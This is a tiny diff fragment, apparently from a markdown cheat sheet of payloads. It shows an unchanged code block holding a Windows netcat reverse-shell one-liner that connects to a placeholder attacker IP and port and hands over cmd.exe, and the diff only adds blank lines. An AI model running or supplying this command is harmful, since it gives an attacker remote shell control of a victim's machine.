@@ -14,3 +14,5 @@ updated_at: '2023-05-29T16:48:52.884824+00:00'
 ```bash
 cmd.exe /C "nc.exe $_ATTACKER_IP $_ATTACKER_PORT -e cmd.exe"
 ```
+
+
